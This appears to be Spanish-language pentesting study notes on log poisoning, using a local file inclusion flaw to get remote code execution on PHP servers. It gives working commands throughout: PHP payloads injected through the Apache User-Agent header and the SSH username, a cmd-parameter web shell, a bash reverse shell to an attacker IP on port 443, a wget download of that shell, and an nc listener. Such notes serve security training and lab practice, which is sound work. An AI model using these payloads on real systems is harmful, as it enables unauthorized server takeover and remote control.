# Log Poisoning (LFI -> RCE)

Tags: #LFI #OWASP #Explotacion #RCE #PHP 

**Log Poisoning** es una técnica en la que un atacante **manipula archivos de registro (logs)** de una aplicación con el fin de ejecutar código malicioso.  
Combinado con una vulnerabilidad de **Local File Inclusion (LFI)**, puede llevar a una **Remote Code Execution (RCE)** en el servidor.

### Funcionamiento

1. El atacante explota un **LFI** para acceder a archivos de log.
2. Inyecta **código malicioso** en campos que son registrados en dichos logs.
3. Cuando el archivo de log es interpretado (ej. como PHP), el código se ejecuta.

### Ejemplos

- **SSH (auth.log / btmp)**
    - Inyectar código PHP en el campo **usuario** al autenticarse.
    - El código queda grabado en el log y se ejecuta al ser incluido vía LFI.

- **Apache (access.log)**
    - Inyectar código PHP en el campo **User-Agent** de una petición HTTP.
    - El código malicioso se registra en `access.log` y se ejecuta al ser leído por el LFI.

### Consideraciones

- El nombre de los archivos de log puede variar según el sistema:
    - Debian/Ubuntu → `auth.log`
    - Red Hat/CentOS → `btmp`
- Esto puede requerir pruebas para ubicar los logs correctos.

## Mirar logs en Apache en WEB

```shell 
# Archivo de logs en Apache por consola
❯ /var/log/apache2/access.log            
```

```shell
Paso 1:
# Mirar los logs 
# Se coloca donde se encuetra el LFI (Path Traversal)
❯ ?file=/var/log/apache2/access.log      # Mirar logs por web 


Notas:
	1. Ruta típica de logs de Apache para ver logs, incluyendo los del 'User Agent ('Mozilla/5.0 (Windows NT...)')' 
	2. 'User Agent': Es un campo del protocolo HTTP que puede utilizarse para transmitir información más o menos detallada sobre el dispositivo de consulta que tramita la solicitud
```

```bash 
# Hacer la solicitud a la web y mirar los logs del 'User-Agent' desde Kali 

Paso 2:
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: PROBANDO"
	# H = Cabecera a modificar
```

## Inyección de comandos 

```shell
Paso 3:
# Ejecutar un comando desde la cabecera 'User Agent'
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system('whoami'); ?>"  

NORA:
	- A veces es necesario ejecutarlo dos veces para ver el output
```

```shell
Paso 4:
# Controlar la ejecución del comando desde la web 
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
	# Escapar el $ para evitar conflictos 

Notas:
	1. ?file=/var/log/apache2/access.log&cmd=whoami   <- IMPORTANTE
	 # Colocar '&cmd=' para ejecutar comandos 
```

```bash 
Paso 5:
# Crear en Kali el archivo 'shell.php' con la revershell  

<?php system("bash -c 'bash -i >& /dev/tcp/<IP_Kali>/443 0>&1'"); ?>


# Compartir la revershell 
❯ python3 -m http.server 80
```

```bash 
Paso 6:
# Desde la web subir el archivo con la Revershell 
	?file=/var/log/apache2/access.log&cmd=wget http://IP_Kali/shell.php

Paso 7: 
# Ejecutar la revershell desde la web 
	http://IP/shell.php 

❯ rlwrap nc -nlvp 443   # Recibir la revershell en Kali
```

## Log Poisoning SSH

```shell 
❯ /var/log/btmp       # Ruta para ver logs en ssh si se tiene permisos 
``` 

```shell
❯ cat btmp            # Mirar logs en SSH
❯ cat auth.log 
```

```shell
❯ ssh test@IP         # Autenticar con ssh
```

```shell
❯ ssh '<?php system($_GET["cmd"]); ?>'@IP


Notas:
	1. Se puede controlar la ejecución del comando, si ese archivo tiene capacidad de escritura
	2. En ?file=/var/log/btmp&cmd=whoami    # Colocar '&cmd=' para ejecutar comandos 
```